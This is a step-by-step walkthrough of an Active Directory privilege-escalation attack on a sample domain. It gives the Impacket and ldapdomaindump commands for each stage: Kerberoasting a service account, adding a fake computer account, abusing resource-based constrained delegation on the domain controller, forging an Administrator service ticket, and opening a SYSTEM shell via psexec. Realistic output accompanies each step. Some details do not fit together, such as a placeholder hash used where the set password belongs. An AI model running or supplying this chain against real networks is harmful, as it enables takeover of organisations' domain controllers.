Example Scenario (Realistic)

Parameter	Value

Domain Name	corp.internal
Domain Controller	dc01.corp.internal (IP: 192.168.1.10)
Domain User	harsh@corp.internal / Winter2025!
Target Service Account (from Kerberoasting)	svc_sql
Privileged Group	Domain Admins
Controlled Host	win10.corp.internal (no admin)
DC Hostname	DC01
You can run:	Python 3.11 on Windows



---

Step-by-step Execution with Realistic Output


---

1. Enumerate Domain Users & Computers

python3 ldapdomaindump.py -u 'corp.internal\\harsh' -p 'Winter2025!' -d corp.internal 192.168.1.10

Key Output (domain_users.json):

{
  "username": "svc_sql",
  "memberOf": [
    "CN=Domain Admins,CN=Users,DC=corp,DC=internal"
  ],
  "servicePrincipalName": [
    "MSSQLSvc/sql01.corp.internal:1433"
  ]
}

Interpretation: svc_sql is a service account with a SPN and is a Domain Admin. This is a jackpot.


---

2. Extract SPNs (Kerberoasting - no cracking)

python3 GetUserSPNs.py corp.internal/harsh:Winter2025! -dc-ip 192.168.1.10 -outputfile kerberoast.txt

Output:

Found 1 ServicePrincipalName(s):
svc_sql@corp.internal
        Hash written to kerberoast.txt

Do NOT crack, just observe the privileged account svc_sql.


---

3. Add a Fake Computer to Domain

python3 addcomputer.py -dc-ip 192.168.1.10 -computer-name FAKEPC -computer-pass 'Pass123!' corp.internal/harsh:Winter2025!

Output:

Successfully added computer account FAKEPC$ with password: Pass123!

Now you control FAKEPC$.


---

4. Set RBCD on DC01 to allow delegation to FAKEPC$

python3 rbcd.py -u harsh -p 'Winter2025!' -d corp.internal -t DC01$ -s FAKEPC$ -dc-ip 192.168.1.10

Output:

Successfully added FAKEPC$ to msDS-AllowedToActOnBehalfOfOtherIdentity of DC01$

Now you can impersonate any user to DC01 via your fake computer.


---

5. Forge TGS Ticket as Administrator

You now forge a TGS ticket that pretends FAKEPC$ is requesting it for Administrator.

python3 getST.py -spn cifs/dc01.corp.internal -impersonate Administrator corp.internal/FAKEPC\$ -dc-ip 192.168.1.10 -hashes :5f7c7c8a27a5b0f9ad51ee5612345678

Output:

[*] Saving ticket in Administrator.ccache

You now have a ticket for Administrator.


---

6. Use the TGS Ticket to Execute Commands on the DC

export KRB5CCNAME=Administrator.ccache

python3 psexec.py corp.internal/Administrator@192.168.1.10 -k -no-pass

Output:

[*] SMBv3.0 dialect used
[*] Target system is DC01 and is Windows Server 2019 Standard
[*] Launching semi-interactive shell...
Microsoft Windows [Version 10.0.17763.2931]
(C) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

You now have full SYSTEM access on the DC.


---

Summary of Example Values Used:

Field	Value

Domain	corp.internal
Domain Controller	dc01.corp.internal (192.168.1.10)
Initial Creds	harsh / Winter2025!
Service Account	svc_sql (Domain Admin)
Fake Computer	FAKEPC$
Tools Used	Python only (ldapdomaindump, Impacket)
Shell on DC	nt authority\system



---
